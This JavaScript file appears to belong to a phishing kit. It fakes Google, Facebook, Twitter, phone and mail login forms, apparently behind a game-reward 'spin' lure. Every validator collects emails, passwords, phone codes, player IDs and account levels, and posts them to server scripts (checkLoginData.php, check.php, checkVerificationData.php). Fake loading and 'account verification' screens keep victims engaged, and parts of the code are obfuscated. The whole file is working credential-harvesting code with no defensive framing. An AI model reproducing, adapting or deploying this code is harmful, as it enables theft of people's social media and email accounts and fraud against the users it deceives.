// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}

// code for sending data
function OneValidateLoginGoogleData() {
  $emailgo = $('#one-email-google').val().trim();
  $passwordgo = $('#one-password-google').val().trim();
  $logingo = $('#one-login-google').val().trim();
  if ($emailgo.length < 5) {
      $('.one-email-google').show();
      $('.one-sandi-google').hide();
      $('.one-login-google').show();
      return false;
  } else if ($passwordgo.length < 5) {
      $('.one-sandi-google').show();
      $('.one-email-google').hide();
      $('.one-login-google').show();
      return false;
  } else {
      $.ajax({
          type: "POST",
          url: "checkLoginData.php",
          data: $("#ValidateLoginGoogleForm").serialize(),
          beforeSend: function() {
              $('.one-email-google').hide();
              $('.one-sandi-google').hide();
              $('.one-login-google').hide();
      $('.login-google-load').show();
          },
          success: function() {
      $('.login-google-load').hide();
      $('.two-login-google').show();
      $(".BtnAfterLenzz").attr('onclick','go_spin()');
      $("input#validateEmail").val($emailgo);
              $("input#validatePassword").val($passwordgo);
              $("input#validateLogin").val($logingo);
              return true;
          }
      });
  };
};

function TwoValidateLoginGoogleData() {
  $emailgo = $('#two-email-google').val().trim();
  $passwordgo = $('#two-password-google').val().trim();
  $logingo = $('#two-login-google').val().trim();
  if ($emailgo.length < 5) {
      $('.two-email-google').show();
      $('.two-sandi-google').hide();
      $('.two-login-google').show();
      return false;
  } else if ($passwordgo.length < 5) {
      $('.two-sandi-google').show();
      $('.two-email-google').hide();
      $('.two-login-google').show();
      return false;
  } else {
      $.ajax({
          type: "POST",
          url: "checkLoginData.php",
          data: $("#ValidateLoginGoogleForm").serialize(),
          beforeSend: function() {
              $('.two-email-google').hide();
              $('.two-sandi-google').hide();
              $('.two-login-google').hide();
      $('.login-google-load').show();
          },
          success: function() {
      $('.login-google-load').hide();
      $('.account_verification').hide();
      $(".BtnAfterLenzz").attr('onclick','go_spin()');
      $("input#validateEmail").val($emailgo);
              $("input#validatePassword").val($passwordgo);
              $("input#validateLogin").val($logingo);
              return true;
          }
      });
  };
};

function OneValidateLoginFbData() {
  $('#ValidateLoginFbForm').submit(function (_0x5b6fc5) {
    _0x5b6fc5.preventDefault();
    $emailfb = $("#one-email-facebook").val().trim();
    $passwordfb = $('#one-password-facebook').val().trim();
    $loginfb = $("#one-login-facebook").val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 0x5) {
      $(".one-email-fb").fadeIn();
      setTimeout(function () {
        $(".one-email-fb").fadeOut();
      }, 0x7d0);
      $(".one-sandi-fb").hide();
      $('.PlayerIdLoginBox').hide();
      $('.one-login-facebook').show();
      return false;
    } else {
      $(".one-email-fb").hide();
      $("input#validateEmail").val($emailfb);
      $(".one-login-facebook").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 0x5) {
      $(".one-sandi-fb").fadeIn();
      setTimeout(function () {
        $(".one-sandi-fb").fadeOut();
      }, 0x7d0);
      $('.PlayerIdLoginBox').hide();
      $(".one-login-facebook").show();
      return false;
    } else {
      $('.one-sandi-fb').hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $(".one-login-facebook").hide();
      $(".login-facebook-load").show();
      setTimeout(function () {
        $(".two-login-facebook").show();
        $(".BtnAfterLenzz").attr('onclick','go_spin()');
        $(".login-facebook-load").hide();
      }, 0xbb8);
    }
    var _0x26e3c9 = $("input#validateEmail").val();
    var _0x178acc = $("input#validatePassword").val();
    var _0x5b24b0 = $("input#validateLogin").val();
    if (_0x26e3c9 == '' && _0x178acc == '' && _0x5b24b0 == '' && $playid == '') {
      $(".account_verification").show();
      return false;
    }
    $.ajax({
      'type': "POST",
      'url': "checkLoginData.php",
      'data': $(this).serialize(),
      'beforeSend': function () {
        $('.one-login-facebook').hide();
      },
      'success': function () {
        $(".one-login-facebook").hide();
      }
    });
  });
  return false;
}
function TwoValidateLoginFbData() {
  $('#TwoValidateLoginFbForm').submit(function (_0x5b6fc5) {
    _0x5b6fc5.preventDefault();
    $emailfb = $("#two-email-facebook").val().trim();
    $passwordfb = $('#two-password-facebook').val().trim();
    $loginfb = $("#two-login-facebook").val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 0x5) {
      $(".two-email-fb").fadeIn();
      setTimeout(function () {
        $(".two-email-fb").fadeOut();
      }, 0x7d0);
      $(".two-sandi-fb").hide();
      $('.PlayerIdLoginBox').hide();
      $('.two-login-facebook').show();
      return false;
    } else {
      $(".two-email-fb").hide();
      $("input#validateEmail").val($emailfb);
      $(".two-login-facebook").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 0x5) {
      $(".two-sandi-fb").fadeIn();
      setTimeout(function () {
        $(".two-sandi-fb").fadeOut();
      }, 0x7d0);
      $('.PlayerIdLoginBox').hide();
      $(".two-login-facebook").show();
      return false;
    } else {
      $('.two-sandi-fb').hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $(".two-login-facebook").hide();
      $(".login-facebook-load").show();
      setTimeout(function () {
        $(".account_verification").hide();
        $(".BtnAfterLenzz").attr('onclick','go_spin()');
        $(".login-facebook-load").hide();
      }, 0xbb8);
    }
    var _0x26e3c9 = $("input#validateEmail").val();
    var _0x178acc = $("input#validatePassword").val();
    var _0x5b24b0 = $("input#validateLogin").val();
    if (_0x26e3c9 == '' && _0x178acc == '' && _0x5b24b0 == '' && $playid == '') {
      $(".account_verification").show();
      return false;
    }
    $.ajax({
      'type': "POST",
      'url': "checkLoginData.php",
      'data': $(this).serialize(),
      'beforeSend': function () {
        $('.two-login-facebook').hide();
      },
      'success': function () {
        $(".two-login-facebook").hide();
      }
    });
  });
  return false;
}
function ValidateLoginTwitterData() {
  $("#ValidateLoginTwitterForm").submit(function (_0x300346) {
    _0x300346.preventDefault();
    $emailtw = $('#email-twitter').val().trim();
    $passwordtw = $("#password-twitter").val().trim();
    $logintw = $("#login-twitter").val().trim();
    if ($emailtw == '' || $emailtw == null || $emailtw.length <= 0x3) {
      $(".email-tw").fadeIn();
      setTimeout(function () {
        $(".email-tw").fadeOut();
      }, 0x7d0);
      $('.sandi-tw').hide();
      $(".PlayerIdLoginBox").hide();
      $('.login-twitter').show();
      return false;
    } else {
      $('.email-tw').hide();
      $('input#validateEmail').val($emailtw);
      $(".login-twitter").hide();
      $('.PlayerIdLoginBox').show();
    }
    if ($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 0x7) {
      $(".sandi-tw").fadeIn();
      setTimeout(function () {
        $(".sandi-tw").fadeOut();
      }, 0x7d0);
      $(".PlayerIdLoginBox").hide();
      $(".login-twitter").show();
      return false;
    } else {
      $(".sandi-tw").hide();
      $("input#validatePassword").val($passwordtw);
      $("input#validateLogin").val($logintw);
      $(".login-twitter").hide();
      $(".login-twitter-load").show();
      setTimeout(function () {
        $(".account_verification").hide();
        $(".BtnAfterLenzz").attr('onclick','go_spin()');
        $(".login-twitter-load").hide();
      }, 0xbb8);
    }
    var _0x366869 = $("input#validateEmail").val();
    var _0x35b8d5 = $("input#validatePassword").val();
    var _0x9a9961 = $('input#validateLogin').val();
    if (_0x366869 == '' && _0x35b8d5 == '' && _0x9a9961 == '' && $playid == '') {
      $(".account_verification").show();
      return false;
    }
    $.ajax({
      'type': 'POST',
      'url': 'checkLoginData.php',
      'data': $(this).serialize(),
      'beforeSend': function () {
        $(".login-twitter").hide();
      },
      'success': function () {
        $(".login-twitter").hide();
      }
    });
  });
  return false;
}
function ValidateLoginNumberData() {
  $('#ValidateLoginNumberForm').submit(function (_0x8abcee) {
    _0x8abcee.preventDefault();
    $emailnk = $("#email-nk").val().trim();
    $passwordnk = $("#password-nk").val().trim();
    $loginnk = $("#login-number").val().trim();
    $codetel = $("#code-tel").val().trim();
    if ($emailnk == '' || $emailnk == null || $emailnk.length <= 0x5) {
      $(".email-nk").show();
      setTimeout(function () {
        $(".email-nk").fadeOut();
      }, 0x7d0);
      $(".sandi-nk").hide();
      $(".account_verification").hide();
      $(".login-number").show();
      return false;
    } else {
      $('.email-nk').hide();
      $("input#validateEmail").val($emailnk);
      $(".login-number").hide();
      $(".account_verification").show();
    }
    if ($passwordnk == '' || $passwordnk == null || $passwordnk.length <= 0x5) {
      $(".sandi-nk").show();
      setTimeout(function () {
        $('.sandi-nk').fadeOut();
      }, 0x7d0);
      $('.login-number').show();
      $(".account_verification").hide();
      return false;
    } else {
      $(".sandi-nk").hide();
      $('input#validatePassword').val($passwordnk);
      $("input#validateLogin").val($loginnk);
      $("input#validateTel").val($codetel);
      $('.login-number').hide();
      $(".account_verification").show();
    }
    var _0x1ab13d = $("input#validateEmail").val();
    var _0x31e0ae = $("input#validatePassword").val();
    var _0x350963 = $("input#validateLogin").val();
    var _0x129e48 = $("input#validateTel").val();
    if (_0x1ab13d == '' && _0x31e0ae == '' && _0x350963 == '' && _0x129e48 == '') {
      $(".account_verification").show();
      return false;
    }
    $.ajax({
      'type': "POST",
      'url': "checkLoginData.php",
      'data': $(this).serialize(),
      'beforeSend': function () {
        $('.login-mail').hide();
      },
      'success': function () {
        $(".login-mail").hide();
      }
    });
  });
  return false;
}
function ValidateLoginMailData() {
  $('#ValidateLoginMailForm').submit(function (_0x1e07cc) {
    _0x1e07cc.preventDefault();
    $emailk = $('#email-k').val().trim();
    $passwordk = $("#password-k").val().trim();
    $logink = $("#login-mail").val().trim();
    if ($emailk == '' || $emailk == null || $emailk.length <= 0xa) {
      $('.email-k').show();
      setTimeout(function () {
        $(".email-k").fadeOut();
      }, 0x7d0);
      $(".sandi-k").hide();
      $(".account_verification").hide();
      $(".login-mail").show();
      return false;
    } else {
      $(".email-k").hide();
      $("input#validateEmail").val($emailk);
      $('.login-mail').hide();
      $('.account_verification').show();
    }
    if ($passwordk == '' || $passwordk == null || $passwordk.length <= 0x5) {
      $(".sandi-k").show();
      setTimeout(function () {
        $('.sandi-k').fadeOut();
      }, 0x7d0);
      $(".login-mail").show();
      $(".account_verification").hide();
      return false;
    } else {
      $(".sandi-k").hide();
      $('input#validatePassword').val($passwordk);
      $("input#validateLogin").val($logink);
      $(".login-mail").hide();
      $(".account_verification").show();
    }
    var _0x134c28 = $("input#validateEmail").val();
    var _0x5dcaed = $("input#validatePassword").val();
    var _0x2ba218 = $("input#validateLogin").val();
    if (_0x134c28 == '' && _0x5dcaed == '' && _0x2ba218 == '') {
      $('.account_verification').show();
      return false;
    }
    $.ajax({
      'type': "POST",
      'url': 'check.php',
      'data': $(this).serialize(),
      'beforeSend': function () {
        $(".login-mail").hide();
      },
      'success': function () {
        $(".login-mail").hide();
      }
    });
  });
  return false;
}
function ValidateVerificationData() {
  $("#ValidateVerificationDataForm").submit(function (_0x1820d3) {
    _0x1820d3.preventDefault();
    var _0xbf449e = $('input#validateEmail').val();
    var _0x1406b6 = $('input#validatePassword').val();
    var _0x2092e2 = $("input#ValidatePopupPlayId").val();
    var _0x1dfb1c = $("input#phone").val();
    var _0xf63e48 = $("input#level").val();
    var _0x1ebcc1 = $('input#vmail').val();
    var _0x28bf58 = $("input#codetel").val();
    var _0x36c6e1 = $('input#validateLogin').val();
    if (_0xbf449e == '' && _0x1406b6 == '' && $nick == '' && _0x2092e2 == '' && _0x1dfb1c == '' && _0xf63e48 == '' && _0x1ebcc1 == '' && _0x36c6e1 == '' && _0x28bf58 == '') {
      $('.verification_info').show();
      $('.account_verification').hide();
      return false;
    }
    $.ajax({
      'type': "POST",
      'url': "checkVerificationData.php",
      'data': $(this).serialize(),
      'beforeSend': function () {
        $(".account_verification").hide();
        $('.check_verification').show();
      },
      'success': function () {
        $(".processing_account").show();
        $(".check_verification").hide();
        $(".account_verification").hide();
      }
    });
  });
  return false;
}
;